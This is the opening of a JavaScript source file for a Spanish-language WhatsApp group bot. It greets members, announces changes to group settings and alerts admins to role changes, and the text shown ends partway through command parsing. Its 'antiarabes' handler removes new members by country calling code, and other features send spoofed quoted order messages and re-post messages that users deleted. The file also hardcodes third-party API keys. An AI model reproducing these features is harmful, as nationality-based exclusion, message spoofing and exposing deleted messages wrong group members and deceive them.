const
  {
    WAConnection: _WAConnection,
    MessageType,
    Presence,
    relayWAMessage,
    MessageOptions,
    Mimetype,
    WAMessageProto,
    WALocationMessage,
    ChatModification,
    WA_MESSAGE_STUB_TYPES,
    ReconnectMode,
    prepareMessageFromContent, 
    ProxyAgent,
    GroupSettingChange,
    WA_DEFAULT_EPHEMERAL,
    waChatKey,
    mentionedJid,
    processTime,
} = require("@adiwajshing/baileys");
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const hx = require('hxz-api')
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const os = require ('os');
const figlet = require('figlet')
const ms = require("pretty-ms")
const Mms = require('parse-ms')
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const ig = require('insta-fetcher')
const { EmojiAPI } = require("emoji-api");
const webp = require('node-webpmux')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const chalk = require('chalk');
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const twitterGetUrl = require("twitter-url-direct")
const imageToBase64 = require('image-to-base64');
const { resolve } = require("path");
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const tiktod = require('tiktok-scraper')
const {fbDown} = require('./lib/fb.js')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close, pickRandom } = require('./lib/functions')
const { addBanned, unBanned, BannedExpired, cekBannedUser } = require('./lib/banned.js')
const { color, bgcolor } = require('./lib/color')
const { fetchKev, getBase64, kyun, createExif, runtime, KevFetch} = require('./lib/fetcher')
const { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const { addVote, delVote } = require('./lib/vote')
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot')
const { webp2mp4File} = require('./lib/webp2mp4')
const { createSticker } = require('wa-sticker-formatter')
const { validmove, setGame } = require("./lib/tictactoe");
const zalgo = require('./lib/zalgo');
const { recognize } = require('./lib/ocr')
const {zenmediafire} = require('./lib/zenmediafire')
const Instagram = require('instagram-web-api');
let configuracion = JSON.parse(fs.readFileSync('./configuracion.json'));
const terminate = require('terminate');
const { ytDonlodMp3, ytDonlodMp4, ytMp3, ytMp4, ytSearch } = require('./lib/youtube.js');
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/tiktok.js");
const util = require('util');
const _gis = require('g-i-s');
const googleIt = require('google-it');
const { promisify } = require('util');
const Json = (string) => {
			return util.format(JSON.stringify(string, null, 2))
			}
// MODULOS NPM
const imgbb = require('imgbb-uploader')
const ameClient = require("amethyste-api")
const ameApi = new ameClient("a47f98b34658c335a86ba19dd12b36841f9ad26f8ef2c2e40f59a8d56edcbd0739adeabbfafb3e199ae7d19afcffe693bbbd27648e7baec64bf308d6bddbbf5b")
imgb = '63ccbd372f6b4d2c84e52ebe93394052'
// MODULOS NPM

const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)

banChats = false
offline = false
antidel = false
antionce = true

targetpc = '50768666666'
owner = '50768666666'
afkmode = '50769111111'
sendc = "35058145555@s.whatsapp.net"
senda = "595986460945@s.whatsapp.net"
sendv = "6285692655520@s.whatsapp.net"
sendm = "50766866666@s.whatsapp.net"
sends = "6283876944538@s.whatsapp.net"
let {
    dueño,
    cia,
    aiden,
    aiden2,
    valak,
    tumor
} = configuracion
fake = 'Kevin'
numbernye = '0'
waktu = '-'
alasan = '-'
prefix = '+'
hit_today = []
shp = '⬡'
const fakeimg = fs.readFileSync('./media/wafle.jpg')
const fakewhat = fs.readFileSync('./media/what.jpg')

//////////// Kevin
//Database
let _scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))

// Sticker Cmd
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}
// constantes

        const chatban = JSON.parse(fs.readFileSync('./src/ban.json'));
        const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
        const antihidetg = JSON.parse(fs.readFileSync("./database/antihidetag.json"));
        const ban = JSON.parse(fs.readFileSync('./src/banned.json'));
        const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
        const welkom = JSON.parse(fs.readFileSync('./database/json/welkom.json'));
        const antifake = JSON.parse(fs.readFileSync('./src/antifake.json'));
        const antiarabes = JSON.parse(fs.readFileSync('./src/antiarabes.json'));
        const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"));
//


/**FECHA DET**/
var date = new Date();

var tahun = date.getFullYear();

var bulan = date.getMonth();
var tanggal = date.getDate();
var hari = date.getDay();
var jams = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();


switch(hari) {
 case 0: hari = "Domingo"; break;
 case 1: hari = "Lunes"; break;
 case 2: hari = "Martes"; break;
 case 3: hari = "Miercoles"; break;
 case 4: hari = "Jueves"; break;
 case 5: hari = "Viernes"; break;
 case 6: hari = "Sabado"; break;
}
switch(bulan) {
 case 0: bulan = "De Enero Del"; break;
 case 1: bulan = "De Febrero Del"; break;
 case 2: bulan = "De Marzo Del"; break;
 case 3: bulan = "De Abril Del"; break;
 case 4: bulan = "De Mayo Del"; break;
 case 5: bulan = "De Junio Del"; break;
 case 6: bulan = "De Julio Del"; break;
 case 7: bulan = "De Agosto Del"; break;
 case 8: bulan = "De Septiembre Del"; break;
 case 9: bulan = "De Octubre Del"; break;
 case 10: bulan = "De Noviembre Del"; break;
 case 11: bulan = "De Diciembre Del"; break;
}
            switch(jams){
                case 0: jams = "Buena Madrugada"; break;
                case 1: jams = "Buena Madrugada"; break;
                case 2: jams = "Buena Madrugada"; break;
                case 3: jams = "Buena Madrugada"; break;
                case 4: jams = "Buena Madrugada"; break;
                case 5: jams = "Buena Madrugada"; break;
                case 6: jams = "Buen Día"; break;
                case 7: jams = "Buen Día"; break;
                case 8: jams = "Buen Día"; break;
                case 9: jams = "Buen Día"; break;
                case 10: jams = "Buen Día"; break;
                case 11: jams = "Buen Mediodía"; break;
                case 12: jams = "Buen Mediodía"; break;
                case 13: jams = "Buen Mediodía"; break;
                case 14: jams = "Buena Tarde"; break;
                case 15: jams = "Buena Tarde"; break;
                case 16: jams = "Buena Tarde"; break;
                case 17: jams = "Buena Tarde"; break;
                case 18: jams = "Buena Noche"; break;
                case 19: jams = "Buena Noche"; break;
                case 20: jams = "Buena Noche"; break;
                case 21: jams = "Buena Noche"; break;
                case 22: jams = "Buena Noche"; break;
                case 23: jams = "Buena Noche"; break;
            }
var tampilTanggal = hari + " "+ tanggal + " " + bulan + " " + tahun;
var tampilWaktu = "Hey Compa: " + jams + ":" + menit + ":" + detik;
var tampilWaktu2 = "Hey Compa: " + jams;
var tampilHari = "" + jams;
var jampi = bulan;
var tengas = jams;

console.log(tampilTanggal);
console.log(tampilWaktu2);

//=================================================//
const vcard2 = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + 'FN:I`am Kҽѵíղ 🧇\n'
            + 'ORG:Este es el número de mi creador. 🧇;\n'
            + 'TEL;type=CELL;type=VOICE;waid=50768666666:+50768666666\n'
            + 'END:VCARD'
//=================================================//

async function starts() {
const kev = new WAConnection()
kev.version = [2, 2119, 6]
kev.logger.level = 'warn'
console.log(color(figlet.textSync('kev', {
        font: 'Standard',
        horizontalLayout: 'default',
        vertivalLayout: 'default',
        width: 80,
        whitespaceBreak: false
    }), 'cyan'))
    console.log(color('[ CREATED BY KEV ]'))
    kev.on('qr', qr => {
        qrcode.generate(qr, { small: true })
        console.log(color('[kev]', 'yellow'), color('Escanea el codigo QR'))
    })

fs.existsSync('./kevin.json') && kev.loadAuthInfo('./kevin.json')
kev.on('connecting', () => {
start('2', color('[ ! ]Conectando....','aqua'))
public = true
})
kev.on('open', () => { 
success('2', color('','red')),
console.log(chalk.keyword("green")('conectado.'))
})
await kev.connect({timeoutMs: 30*1000}) 
fs.writeFileSync('./kevin.json', JSON.stringify(kev.base64EncodedAuthInfo(), null, '\t'))
//=================================================//
kev.on('CB:action,,battery', json => {
global.batteryLevelStr = json[2][0][1].value
global.batterylevel = parseInt(batteryLevelStr)
baterai = batterylevel
if (json[2][0][1].live == 'true') charging = 'Si'
if (json[2][0][1].live == 'false') charging = 'No'
console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ 🔋Nivel de carga de la bateria ]"), chalk.greenBright(batterylevel+'%'), chalk.keyword("cyan")("Esta cargando?"), chalk.keyword("yellow")(charging))	
})
//
    kev.on('group-update', async (anu) => {
    const falfa = { "key" : {"remoteJid": "299277777@g.us","fromMe": false,"participant": '0@s.whatsapp.net'},message: {orderMessage: {itemCount : -0,status: 1,surface : 1,message: `_\`C̷r̷e̷a̷t̷e̷d̷ B̷y̷ K̷e̷v̷i̷n̷ 🧇\n🔖 Prefix:「 ${prefix} 」`,orderTitle: 'kev BOT',sellerJid: `kevin`,thumbnail: fakeimg}}}
metdata = await kev.groupMetadata(anu.jid)
        if(anu.announce == 'false'){
        teks = `*🧇「 G̷r̷u̷p̷o̷ A̷b̷i̷e̷r̷t̷o̷ 」🧇*\n\n_Ahora todos pueden enviar mensajes_`
        kev.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa, contextInfo: {"externalAdReply":{"title": `凯文安东尼奥`,"body": "I`am Kҽѵíղ","previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/0d0e56896a12dcee28203.jpg`,"thumbnail": fs.readFileSync('./media/ye.jpg'),"sourceUrl": `https://wa.me/qr/3NRSPXKCQ5Z7C1`}}})
        console.log(`- [ Group Opened ] - In ${metdata.subject}`)
      }
      else if(anu.announce == 'true'){
        teks = `*🧇「 G̷r̷u̷p̷o̷ C̷e̷r̷r̷a̷d̷o̷ 」🧇*\n\n_Ahora solos los administradores pueden escribir_`
        kev.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
        console.log(`- [ Group Closed ] - In ${metdata.subject}`)
      }
      else if(!anu.desc == ''){
        tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
        teks = `*🧇「 D̷e̷s̷c̷r̷i̷p̷c̷i̷ó̷n̷ D̷e̷l̷ G̷r̷u̷p̷o̷ C̷a̷m̷b̷i̷a̷d̷a̷ 」🧇*\n\n  *𝕷⃝🧇 ∙ Descripción cambiada por:* _@${anu.descOwner.split('@')[0]}_\n\n  *𝕷⃝🧇 ∙ Nueva descripción:* \n\n${anu.desc}`
        kev.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag], "externalAdReply":{"title": `凯文安东尼奥`,"body": "I`am Kҽѵíղ","previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/0d0e56896a12dcee28203.jpg`,"thumbnail": fs.readFileSync('./media/ye.jpg'),"sourceUrl": `https://wa.me/qr/3NRSPXKCQ5Z7C1`}}})
        console.log(`- [ Group Description Change ] - In ${metdata.subject}`)
      }
      else if(anu.restrict == 'false'){
        teks = `*🧇「 C̷o̷n̷f̷i̷g̷u̷r̷a̷c̷i̷ó̷n̷ D̷e̷ G̷r̷u̷p̷o̷  」🧇*\n\nAdvertencia, ahora todos pueden cambiar el titulo, imagen y descripcion del grupo\n\n*_Esta accion es MUY peligrosa para los usuarios_*`
        kev.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa, contextInfo: {"externalAdReply":{"title": `凯文安东尼奥`,"body": "I`am Kҽѵíղ","previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/0d0e56896a12dcee28203.jpg`,"thumbnail": fs.readFileSync('./media/ye.jpg'),"sourceUrl": `https://wa.me/qr/3NRSPXKCQ5Z7C1`}}})
        console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
      }
      else if(anu.restrict == 'true'){
        teks = `*🧇「 C̷o̷n̷f̷i̷g̷u̷r̷a̷c̷i̷ó̷n̷ D̷e̷ G̷r̷u̷p̷o̷  」🧇*\n\nAhora solo los admins pueden cambiar la info del grupo.\n\n*_El grupo esta mas seguro_*`
        kev.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa,  contextInfo: {"externalAdReply":{"title": `凯文安东尼奥`,"body": "I`am Kҽѵíղ","previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/0d0e56896a12dcee28203.jpg`,"thumbnail": fs.readFileSync('./media/ye.jpg'),"sourceUrl": `https://wa.me/qr/3NRSPXKCQ5Z7C1`}}})
        console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
      }
    })
//
/*====================================================[ CHAT UPDATE ]==============================================================*/     
//group-participants-update -------------------------------------------------------- 
    kev.on('group-participants-update', async (anu) => {
    const mdata = await kev.groupMetadata(anu.jid)
    if(antifake.includes(anu.jid)) {
    if (anu.action == 'add'){
      num = anu.participants[0]
      if(!num.split('@')[0].startsWith(507)) {
          setTimeout(async function () {
            kev.groupRemove(mdata.id, [num])
          }, 1000)
        }
      }
    }
  const mdata2 = await kev.groupMetadata(anu.jid)
    if(antiarabes.includes(anu.jid)) {
    if (anu.action == 'add'){
      num2 = anu.participants[0]
      if(num2.startsWith('92')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('91')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('98')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('94')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('93')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('971')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('968')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('212')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('966')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('994')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('213')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('218')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('216')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('20')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('229')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('213')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('62')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('48')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('90')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('967')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('964')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('222')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('249')) return kev.groupRemove(mdata2.id, [num2])
      if(num2.startsWith('963')) return kev.groupRemove(mdata2.id, [num2])
      }
    }
  if (!welkom.includes(anu.jid)) return
  try {
    console.log(anu)
    if (anu.action == 'add') {
      num = anu.participants[0]
      usrw = kev.contacts[num] != undefined ? kev.contacts[num].vname || kev.contacts[num].notify : undefined
      const mdata = await kev.groupMetadata(anu.jid)
      const isGroup3 = anu.jid.endsWith('@g.us')
      const groupMembers3 = isGroup3 ? mdata.participants : ''
      const groupDesc2 = isGroup3 ? mdata.desc : ''
      const FakeWelcome = { "key" : {"remoteJid": "299277777@g.us","fromMe": false,"participant": '0@s.whatsapp.net'},message: {orderMessage: {itemCount : -9999999,status: 1,surface : 1,message: `_\`C̷r̷e̷a̷t̷e̷d̷ B̷y̷ K̷e̷v̷i̷n̷ 🧇\n🔖 Prefix:「 ${prefix} 」`,orderTitle: 'kev BOT',sellerJid: `${mdata.subject}`,thumbnail: fakeimg}}}
linkgc3 = await kev.groupInviteCode(anu.jid)
      const groupAdmins3 = isGroup3 ? getGroupAdmins(groupMembers3) : ''
      try {
        ppimg = await kev.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
      } catch {
        ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
      }
      teks = `*🧇「 B̷i̷e̷n̷v̷e̷n̷i̷d̷@̷ A̷ E̷l̷ G̷r̷u̷p̷o̷ 」🧇* \n\n*Hola* *@${num.split('@')[0]}* Como Estas?\n\n*Yo soy Kevin y te doy la bienvenida a:*\n *${mdata.subject}*\n\n  *𝕷⃝🧇 ∙ Usuarios:* _${groupMembers3.length}_\n\n  *𝕷⃝🧇 ∙ Administradores:* _${groupAdmins3.length}_\n\n  *𝕷⃝🧇 ∙ Reglas Del Grupo:* \n\n${groupDesc2}\n\n`
      let buff = await getBuffer(ppimg)
loc = {
            "degreesLatitude": 0,
            "degreesLongitude": 0,
            "jpegThumbnail": buff
            }
            kev.sendMessage(mdata.id, 
            {"contentText": `${teks}`,
            "footerText": `@Created By Kevin 🧇`,
            "buttons": [
            {"buttonId": `${prefix}menu`,
            "buttonText": {"displayText": "🧇 MENU 🧇"
            },"type": "RESPONSE"},
            {"buttonId": `${prefix}stats`,
            "buttonText": {"displayText": "🧇 BOT STATS 🧇"
            },"type": "RESPONSE"}
            ], "headerType": 6,
            "locationMessage": loc,
            quoted: null
            }, MessageType.buttonsMessage, { contextInfo: {mentionedJid: [ num], "forwardingScore": 9999, "isForwarded": true, "externalAdReply": { "title": `Welcome To The Group`, "body": "_\`C̷r̷e̷a̷t̷e̷d̷ B̷y̷ K̷e̷v̷i̷n̷ 🧇", "sourceUrl": `https://wa.me/qr/3NRSPXKCQ5Z7C1`,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/0d0e56896a12dcee28203.jpg`,"thumbnail": fs.readFileSync('./media/ye.jpg')}}})
      } else if (anu.action == 'promote') {
      num = anu.participants[0]
      try {
        ppimg = await kev.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
      } catch {
        ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
      }
      if (anu.action == 'promote') {
      num = anu.participants[0]
      usrw = kev[num] != undefined ? kev.contacts[num].vname || kev.contacts[num].notify : undefined
      const mdata = await kev.groupMetadata(anu.jid)
      const isGroup3 = anu.jid.endsWith('@g.us')
      const groupMembers3 = isGroup3 ? mdata.participants : ''
      const groupAdmins3 = isGroup3 ? getGroupAdmins(groupMembers3) : ''
      const FakeWelcome = { "key" : {"remoteJid": "299277777@g.us","fromMe": false,"participant": '0@s.whatsapp.net'},message: {orderMessage: {itemCount : -9999999,status: 1,surface : 1,message: `_\`C̷r̷e̷a̷t̷e̷d̷ B̷y̷ K̷e̷v̷i̷n̷ 🧇\n🔖 Prefix:「 ${prefix} 」`,orderTitle: 'kev BOT',sellerJid: `${mdata.subject}`,thumbnail: fakeimg}}}
      try {
        ppimg = await kev.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
      } catch {
      ppimg = 'https://image.shutterstock.com/image-vector/incognito-unknown-person-silhouette-man-260nw-1024924807.jpg'
        }
        teks = `*🧇「 A̷n̷t̷i̷-̷R̷a̷i̷d̷ 」🧇* \n*Recientemente se ha promovido un miembro a administrador, Para evitar raid, Este mensaje aparece*\n\n  *𝕷⃝🧇 ∙ Nombre:* _${usrw}_\n  *𝕷⃝🧇 ∙ Nuevo Admin:* _@${num.split('@')[0]}_\n  *𝕷⃝🧇 ∙ Grupo:* _${mdata.subject}_\n\n*_Este mensaje ha mencionado a todos los admins._*`
    console.log(groupAdmins3)
    const buffet = await getBuffer(ppimg)
    await kev.sendMessage(mdata.id, buffet, MessageType.image, {caption : teks, contextInfo : {mentionedJid : groupAdmins3, "externalAdReply": { "title": "New Admin Detected", "body": "_\`C̷r̷e̷a̷t̷e̷d̷ B̷y̷ K̷e̷v̷i̷n̷ 🧇", "sourceUrl": `https://wa.me/qr/3NRSPXKCQ5Z7C1`,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/0d0e56896a12dcee28203.jpg`,"thumbnail": fs.readFileSync('./media/ye.jpg')}}})
    console.log("ANTIRAID!!!!")
      }
      } else if (anu.action == 'demote') {
      num = anu.participants[0]
      usrw = kev.contacts[num] != undefined ? kev.contacts[num].vname || kev.contacts[num].notify : undefined
      const mdata = await kev.groupMetadata(anu.jid)
      const isGroup3 = anu.jid.endsWith('@g.us')
      const groupMembers3 = isGroup3 ? mdata.participants : ''
      const groupAdmins3 = isGroup3 ? getGroupAdmins(groupMembers3) : ''
      const FakeWelcome = { "key" : {"remoteJid": "299277777@g.us","fromMe": false,"participant": '0@s.whatsapp.net'},message: {orderMessage: {itemCount : -9999999,status: 1,surface : 1,message: `_\`C̷r̷e̷a̷t̷e̷d̷ B̷y̷ K̷e̷v̷i̷n̷ 🧇\n🔖 Prefix:「 ${prefix} 」`,orderTitle: 'kev BOT',sellerJid: `${mdata.subject}`,thumbnail: fakeimg}}}
      try {
        ppimg = await kev.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
      } catch {
      ppimg = 'https://image.shutterstock.com/image-vector/incognito-unknown-person-silhouette-man-260nw-1024924807.jpg'
        }
        teks = `*🧇「 A̷n̷t̷i̷-̷R̷a̷i̷d̷ 」🧇*\n*Recientemente se ha desistido un administrador a miembro, Para evitar raid, Este mensaje aparece*\n\n  *𝕷⃝🧇 ∙ Nombre:* _${usrw}_\n  *𝕷⃝🧇 ∙ Ex Admin:* _@${num.split('@')[0]}_\n  *𝕷⃝🧇 ∙ Grupo:* _${mdata.subject}_\n\n*_Este mensaje ha mencionado a todos los admins._*`
    console.log(groupAdmins3)
    const buffet = await getBuffer(ppimg)
    kev.sendMessage(mdata.id, buffet, MessageType.image, {caption : teks, contextInfo : {mentionedJid : groupAdmins3, num, "externalAdReply": { "title": "Administration Removed", "body": "_\`C̷r̷e̷a̷t̷e̷d̷ B̷y̷ K̷e̷v̷i̷n̷ 🧇", "sourceUrl": `https://wa.me/qr/3NRSPXKCQ5Z7C1`,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/0d0e56896a12dcee28203.jpg`,"thumbnail": fs.readFileSync('./media/ye.jpg')}}})
    } else if (anu.action == 'remove') {
      num = anu.participants[0]
      const mdata = await kev.groupMetadata(anu.jid)
      const isGroup3 = anu.jid.endsWith('@g.us')
      const groupMembers3 = isGroup3 ? mdata.participants : ''
      const groupAdmins3 = isGroup3 ? getGroupAdmins(groupMembers3) : ''
      const FakeWelcome = { "key" : {"remoteJid": "299277777@g.us","fromMe": false,"participant": '0@s.whatsapp.net'},message: {orderMessage: {itemCount : -9999999,status: 1,surface : 1,message: `_\`C̷r̷e̷a̷t̷e̷d̷ B̷y̷ K̷e̷v̷i̷n̷ 🧇\n🔖 Prefix:「 ${prefix} 」`,orderTitle: 'kev BOT',sellerJid: `${mdata.subject}`,thumbnail: fakeimg}}}
      try {
        ppimg = await kev.getProfilePicture(`${num.split('@')[0]}@c.us`)
      } catch {
        ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
      }
      teks = `*🧇「 N̷ó̷s̷ V̷e̷m̷o̷s̷ 」🧇* \n\n*@${num.split('@')[0]} Espero vuelvas pronto, un saludo...*`
      let buff = await getBuffer(ppimg)
      kev.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num], "externalAdReply": { "title": "See You Soon User", "body": "_\`C̷r̷e̷a̷t̷e̷d̷ B̷y̷ K̷e̷v̷i̷n̷ 🧇", "sourceUrl": `https://wa.me/qr/3NRSPXKCQ5Z7C1`,"previewType": "PHOTO","thumbnailUrl": `https://telegra.ph/file/0d0e56896a12dcee28203.jpg`,"thumbnail": fs.readFileSync('./media/ye.jpg')}}})
    }
  } catch (e) {
    console.log('Error : %s', color(e, 'yellow'))
  }
    })
//group-participants-update -------------------------------------------------------- 

//=================================================//
kev.on('message-delete', async (m) => {
var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
                case 0: hari = 'Domingo'; break;
                case 1: hari = 'Lunes'; break;
                case 2: hari = 'Martes'; break;
                case 3: hari = 'Miercoles'; break;
                case 4: hari = 'Jueves'; break;
                case 5: hari = 'Viernes'; break;
                case 6: hari = 'Sabado'; break;
            }
            switch(bulan1) {
                case 0: bulan = "De Enero Del"; break;
                case 1: bulan = "De Febrero Del"; break;
                case 2: bulan = "De Marzo Del"; break;
                case 3: bulan = "De Abril Del"; break;
                case 4: bulan = "De Mayo Del"; break;
                case 5: bulan = "De Junio Del"; break;
                case 6: bulan = "De Julio Del"; break;
                case 7: bulan = "De Agosto Del"; break;
                case 8: bulan = "De Septiembre Del"; break;
                case 9: bulan = "De Octubre Del"; break;
                case 10: bulan = "De Noviembre Del"; break;
                case 11: bulan = "De Diciembre Del"; break;
            }
                 var tampilHari = '' + hari + ', ' + tanggal + ' ' + bulan1 + ' ' + tahun;
                var tampilJam = '' + jam + ':' + menit + ':' + detik;
var ase = new Date();
                        var waktoo = ase.getHours();
                        switch(waktoo){
                case 0: waktoo = "Buena Media Noche"; break;
                case 1: waktoo = "Buena Madrugada"; break;
                case 2: waktoo = "Buena Madrugada"; break;
                case 3: waktoo = "Buena Madrugada"; break;
                case 4: waktoo = "Buena Madrugada"; break;
                case 5: waktoo = "Buena Madrugada"; break;
                case 6: waktoo = "Buen Día"; break;
                case 7: waktoo = "Buen Día"; break;
                case 8: waktoo = "Buen Día"; break;
                case 9: waktoo = "Buen Día"; break;
                case 10: waktoo = "Buen Día"; break;
                case 11: waktoo = "Buen Mediodía"; break;
                case 12: waktoo = "Buen Mediodía"; break;
                case 13: waktoo = "Buen Mediodía"; break;
                case 14: waktoo = "Buena Tarde"; break;
                case 15: waktoo = "Buena Tarde"; break;
                case 16: waktoo = "Buena Tarde"; break;
                case 17: waktoo = "Buena Tarde"; break;
                case 18: waktoo = "Buena Noche"; break;
                case 19: waktoo = "Buena Noche"; break;
                case 20: waktoo = "Buena Noche"; break;
                case 21: waktoo = "Buena Noche"; break;
                case 22: waktoo = "Buena Noche"; break;
                case 23: waktoo = "Buena Noche"; break;
            }
            var tampilUcapan = '' + waktoo; 
let delkey = m.key
        let c = kev.chats.get(delkey.remoteJid)
        let a = c.messages.dict[`${delkey.id}|${delkey.fromMe ? 1: 0}`]
        let delcontent = kev.generateForwardMessageContent(a, false)
        let deltipe = Object.keys(delcontent)[0]
if (antidel === false) return
if (m.key.remoteJid == 'status@broadcast') return
if (m.key.fromMe) return
const type2 = Object.keys(m.message)[0]
console.log(color('[ ANTI ELIMINAR MENSAJE ]', 'magenta'), color(`MENSAJE ELIMINADO DETECTADO`, 'red')) 
kev.sendMessage(m.key.remoteJid, `*🧇「 A̷n̷t̷i̷D̷e̷l̷e̷t̷e̷ M̷e̷n̷s̷a̷j̷e̷s̷ 」🧇️*

*• 🧇 Usuario:* @${m.participant.split("@")[0]}
*• 🧇 Hora:* ${tampilJam}
*• 🧇 Fecha:* ${tampilTanggal}
*• 🧇 Tipo De Mensaje:* ${deltipe}`, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant],externalAdReply : { title : `凯文安东尼奥`, body : "Jazz Del Resultado....", mediaType: 2, thumbnail: fakewhat, mediaUrl : `https://youtu.be/wjh2gav5a48`}}})
setTimeout( () => {
                kev.copyNForward(m.key.remoteJid, m.message)
                }, 1000)
                })
//=================================================//
kev.on('chat-update', async(vin) => {
    try {
        if (!vin.hasNewMessage) return
        vin = vin.messages.all()[0]
		if (!vin.message) return
		if (vin.key && vin.key.remoteJid == 'status@broadcast') return
		global.blocked
    vin.message = (Object.keys(vin.message)[0] === 'ephemeralMessage') ? vin.message.ephemeralMessage.message : vin.message
    const content = JSON.stringify(vin.message)
		const from = vin.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
    const type = Object.keys(vin.message)[0]        
    const cmd = (type === 'conversation' && vin.message.conversation) ? vin.message.conversation : (type == 'imageMessage') && vin.message.imageMessage.caption ? vin.message.imageMessage.caption : (type == 'videoMessage') && vin.message.videoMessage.caption ? vin.message.videoMessage.caption : (type == 'extendedTextMessage') && vin.message.extendedTextMessage.text ? vin.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
